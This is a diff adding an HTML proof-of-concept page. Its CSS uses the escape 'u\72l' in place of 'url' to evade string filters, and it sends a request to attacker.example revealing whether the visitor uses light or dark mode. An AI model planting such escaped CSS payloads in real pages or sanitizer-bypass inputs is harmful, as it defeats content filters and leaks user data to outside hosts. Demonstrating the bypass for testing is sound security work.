@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>u72l url escape PoC</title>
+<style>
+  .probe {
+    width: 120px;
+    height: 120px;
+    margin: 40px;
+    background-color: #ddd;
+    display: inline-block;
+  }
+
+  /* Light mode: send /light */
+  @media (prefers-color-scheme: light) {
+    .probe {
+      /* "url" spelled as u\72l: CSS escape for "r" (U+0072) */
+      background-image: u\72l("https://attacker.example/light");
+    }
+  }
+
+  /* Dark mode: send /dark */
+  @media (prefers-color-scheme: dark) {
+    .probe {
+      background-image: u\72l("https://attacker.example/dark");
+    }
+  }
+</style>
+</head>
+<body>
+  <p>Open DevTools → Network tab and reload this page.</p>
+  <p>You should see only one of the two URLs requested, depending on system dark/light mode.</p>
+  <div class="probe"></div>
+</body>
+</html>
